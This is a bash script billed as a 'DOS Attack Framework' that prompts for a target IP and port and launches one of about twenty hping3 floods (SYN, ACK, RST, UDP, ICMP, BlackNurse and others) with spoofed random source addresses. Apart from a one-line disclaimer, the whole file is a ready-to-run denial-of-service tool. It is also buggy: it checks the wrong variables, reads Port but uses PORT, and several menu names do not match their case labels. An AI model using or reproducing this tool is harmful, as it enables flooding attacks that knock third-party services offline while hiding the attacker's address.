#!/bin/bash

# Run as Root!
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# hping3 directory
hping='/usr/sbin/hping3'

# Welcome Message
whiptail --msgbox "Welcome to DOS Attack Framework" 10 40
whiptail --msgbox "Do not use for malicious attacks!" 10 40

# Destination IP Address
IP=$(whiptail --inputbox "Please enter the destination IP Adresss" 10 50 3>&1 1>&2 2>&3)
if [ -z "$CHOICE" ]
then
  exit
fi

# Destination Port Adress
Port=$(whiptail --inputbox "Please enter the destination Port Adress" 10 50 3>&1 1>&2 2>&3)
if [ -z "$CHOICE" ]
then
  exit
fi  
 
# Attack Choice
while [ 1 ]
do
CHOICE=$(whiptail --menu "Please select the attack type" 18 110 10 \
"SYN-Flood" "sends TCP packets with SYN flag" \
"PUSH-Flood" "sends TCP packets with PUSH flag" \
"PUSH+ACK-Flood" "sends TCP packets with PUSH+ACK flags" \
"PUSH+ACK-Flood(with Timestamp)" "sends PUSH+ACK flag with manipulated timestamp values" \
"ACK-Flood" "sends TCP packets with ACK flag" \
"ACK-Flood(with Timestamp)" "sends ACK flag with manipulated timestamp values" \
"ACK-Flood(single source)" "sends ACK flag from single port" \
"RST-FLood" "sends TCP packers with RST flag" \
"FIN-Flood" "sends TCP packets with FIN flag" \
"SYN+ACK-Flood" "sends TCP packets with SYN+ACK flags" \
"SYN+ACK-Flood(with Timestamp)" "sends SYN+ACK flag with manipulated timestamp values" \
"UDP-Flood" "send a high volume of UDP packets" \
"UDP-FLood(volumetric)" "sends massive UDP traffic" \
"UDP-Flood(fragmented)" "sends fragmented UDP packets" \
"ICMP-Flood" "sends a high volume of ICMP packets" \
"ICMP-Flood(volumetric)" "sends massive ICMP traffic" \
"XMAS-Flood" "sends TCP packets with specific flag combinations" \
"YMAS-FLood" "sends TCP packets with specific flag combinations" \
"BlackNurse" "A complex attack with ICMP" 3>&1 1>&2 2>&3)


if [ -z "$CHOICE" ]
then
  exit
else
  if (whiptail --yesno --defaultno "Start Attack?" 10 50) 
  then
        break
  fi
fi
done

case $CHOICE in
        "SYN-Flood")
                cmd="$hping -i u1 -S --rand-source -p $PORT $IP --tos 21 --ttl 33 -d 99"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "PUSH-Flood")
                cmd="$hping -P -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "PUSH+ACK-Flood")
                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tos 23 --ttl 44 -d 12"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "PUSH+ACK-Flood(with Timestamp)")
                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 78 --ttl 43 -d 37"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "SYN+ACK-Flood")
                cmd="$hping -SA -p $PORT $IP --flood --rand-source --tos 12 --ttl 39 -d 90"
                echo "Running: "$cmd
                eval $cmd
                ;;	
        "SYN+ACK-Flood(with Timestamp)")
                cmd="$hping -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 67 --ttl 134 -d 53"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "ICMP-Flood")
                cmd="$hping --icmp -i u1 $IP --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "ICMP-Flood(volumetric)")
                cmd="$hping --icmp -i u1 -d 1300 $IP --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "ACK-Flood")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tos 28 --ttl 124 -d 98"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "ACK-Flood(with Timestamp)")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 132 -d 91"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "ACK-Flood(single source)")
                cmd="$hping --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 77 --ttl 167 -d 80"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "RST-Flood")
                cmd="$hping --rst -p $PORT $IP --flood --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "FIN-Flood")
                cmd="$hping --fin -p $PORT $IP --flood --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "UDP-Flood")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "UDP-FLood(volumetric)")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source --data 1400"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "UDP-Flood(fragmented)")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source -x"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "BlackNurse")
                cmd="$hping --icmp -C 8 -K 3 --flood $IP --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "X-MAS-Flood")
                cmd="$hping --xmas -p $PORT $IP --flood --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
        "Y-MAS-Flood")
                cmd="$hping --ymas -p $PORT $IP --flood --rand-source"
                echo "Running: "$cmd
                eval $cmd
                ;;
esac  
